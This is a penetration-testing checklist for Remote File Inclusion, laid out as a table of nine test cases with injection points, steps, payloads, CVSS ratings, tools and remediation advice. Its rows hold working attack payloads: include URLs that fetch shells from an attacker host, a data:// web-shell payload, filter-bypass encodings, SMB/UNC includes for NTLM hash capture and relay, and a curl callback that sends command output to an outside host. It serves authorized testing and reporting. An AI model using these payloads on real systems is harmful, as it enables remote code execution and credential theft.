# RFI — Checklist

Expert per-attack **test-case matrix** for RFI — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*9 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| RFI-001 | Find include sinks + stand up a payload host | Recon &amp; Lab | page/file/include/template/module/plugin/theme URL params; confirmed LFI include sinks | 1. Find include sinks selectable by URL; re-test confirmed LFI INCLUDE sinks as RFI candidates.<br>2. Stand up a payload host serving PHP as text/plain and logging hits (poc/payload_host.py).<br>3. Stand up an OOB listener (interactsh) for blind cases. | A list of include sinks and a live payload host + OOB listener. | <code>?page=http://$ATTACKER/shell.txt ; payload_host.py serving text/plain</code> | RFI needs a text/plain payload host; serving as PHP would execute on your box, not proof. | Info | 0.0 (N/A) | poc/payload_host.py, interactsh | CWE-98; OWASP Testing Guide: RFI (WSTG-INPV-11) |
| RFI-002 | Baseline — prove EXECUTION (not fetch) | Baseline | Each include sink | 1. Point the include at your host with &lt;?php echo 7&#42;7&#42;7; ?&gt; -&gt; '343' appears = execution = RFI.<br>2. Distinguish: executed (RFI) / fetched-only (SSRF) / raw-text (non-exec) / no-hit.<br>3. Note forced suffix, allow_url_include behavior, server source IP. | '343' (or your computed marker) appears, proving your code executed on the target. | <code>?page=http://$ATTACKER/shell.txt with &lt;?php echo 7&#42;7&#42;7; ?&gt; -&gt; 343</code> | Execution distinguishes RFI (Critical RCE) from a mere SSRF fetch. | Info | 0.0 (N/A) | poc/payload_host.py | CWE-98; PortSwigger Web Security Academy: Remote file inclusion |
| RFI-003 | Serve as text/plain + defeat forced .php suffix | Make it Land | Sinks appending a forced extension | 1. Serve the payload as .txt / text/plain (so it isn't executed on your box).<br>2. Defeat a forced .php suffix: append ? (most reliable), %23 (fragment), or %00 (legacy).<br>3. Use :80 if high ports are egress-blocked. | The remote payload is included and executed despite the forced suffix. | <code>?page=http://$ATTACKER:8000/shell.txt?  (the ? swallows an appended .php)</code> | Restores RFI execution against a forced extension. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/payload_host.py | CWE-98; CWE-94; HackTricks: LFI/RFI |
| RFI-004 | Scheme / encoding / host-allowlist bypass | Make it Land | Sinks filtering scheme/host | 1. Scheme/encoding: hTtP://, http:/\host, http://0xC0A80001/ (hex IP), http://3232235521/ (decimal), encoded slash.<br>2. Host allowlist: open-redirect bounce / @ / contains / trusted subdomain.<br>3. Also ftp:// and :80. | The include reaches your host despite scheme/host filtering. | <code>?page=hTtP://0xC0A80001/shell.txt? ; ?page=http://trusted.com@$ATTACKER/shell.txt?</code> | Bypasses scheme/host filters - proves the fix incomplete. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp | CWE-98; CWE-94; HackTricks: LFI/RFI |
| RFI-005 | data:// / php://input when http:// is blocked | Make it Land | Sinks with allow_url_include but blocked http fetch | 1. data://text/plain;base64,&lt;b64 php&gt; executes without a remote fetch.<br>2. php://input with the PHP in the POST body.<br>3. expect://id where the wrapper is enabled. | A wrapper executes your code with no outbound fetch. | <code>?page=data://text/plain;base64,&lt;b64 &lt;?php system($_GET[c]);?&gt;&gt;&amp;c=id ; php://input</code> | RFI-equivalent RCE when http:// egress is blocked - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp, curl | CWE-98; CWE-94; HackTricks: LFI/RFI |
| RFI-006 | Windows UNC / SMB include + NTLM capture/relay + WebDAV | Make it Land | Windows include sinks | 1. UNC/SMB include: \\$ATTACKER\share\shell.php via impacket-smbserver.<br>2. Even if it doesn't execute, the UNC fetch leaks NetNTLMv2 to Responder (crack -m 5600) or relay (ntlmrelayx) - an SSRF/auth-coercion finding on its own.<br>3. SMB/445 blocked -&gt; WebDAV: \\$ATTACKER@80\share\x / @SSL@443 (UNC over HTTP/HTTPS). | The UNC include executes and/or leaks NetNTLMv2 to your listener. | <code>\\$ATTACKER\share\shell.php ; \\$ATTACKER@80\share\x (WebDAV)</code> | RCE and/or NTLM hash capture/relay - Critical/High. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | impacket-smbserver, Responder, ntlmrelayx | CWE-98; CWE-94; HackTricks: LFI/RFI |
| RFI-007 | RCE impact + blind execution proof | Impact — RCE | Confirmed RFI | 1. Confirm RCE with a benign computed marker, then a single system('id')/whoami.<br>2. Blind: prove execution via a callback CARRYING command output (curl $COLLAB/exec_$(id)) or sleep(10) - not just a fetch.<br>3. Authorized red-team only: shell / read config (read-only); clean up. | id/whoami output (or a command-output callback) confirms code execution. | <code>&amp;c=id ; blind: &lt;?php system('curl -s http://$COLLAB/exec_$(id&#124;tr " " _)'); ?&gt;</code> | Remote code execution on the target - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/payload_host.py, interactsh | CWE-98; CWE-94; PortSwigger Web Security Academy: Remote file inclusion |
| RFI-008 | False-positive filter (RFI vs SSRF) | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT as RFI: the server only FETCHED your URL (no execution) -&gt; that's SSRF, report there; raw &lt;?php text merely DISPLAYED (non-executing context); open redirect / remote image mislabeled; http:// refused and you DIDN'T test data:///php://input/UNC; a blind hit with NO execution proof; DoS via a huge remote file.<br>2. REQUIRE: proven EXECUTION (computed marker / id / command-output callback). | Only proven-execution candidates are RFI; fetch-only is reclassified SSRF. | <code>fetch-only = SSRF ; displayed &lt;?php = non-exec ; blind hit w/o exec = not proven</code> | Protects credibility; RFI is dense with SSRF-mislabeled and non-exec false positives. | Info | 0.0 (N/A) | manual | CWE-98; PortSwigger Web Security Academy: Remote file inclusion |
| RFI-009 | Client-facing impact &amp; SAFE PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with RCE; state it's execution (RFI), not a fetch (SSRF).<br>2. Provide the include payload, the payload-host log, and the computed marker (343) + one id output.<br>3. Set CVSS 3.1 + CWE-98 (+94). Remediation: never include from user input; use an allowlist of fixed local modules; disable allow_url_include/allow_url_fopen; block dangerous wrappers; egress-filter.<br>4. Benign marker + one id, remove written files/shells, validate creds read-only; de-dupe to one sink, confirm on production. | A reproducible, correctly-rated RCE PoC with clear remediation. | <code>PoC: include payload + host log + 343 marker + one id + CVSS + CWE-98 + remediation.</code> | Converts execution into a defensible Critical (RCE) report. | Info | 0.0 (N/A) | CVSS calculator, RFI_REPORT_TEMPLATE.md | CWE-98; CWE-94; FIRST CVSS v3.1; OWASP Testing Guide: RFI (WSTG-INPV-11)  &#124;  TOP REFERENCES: PayloadsAllTheThings; HackTricks; OWASP; impacket/Responder docs |
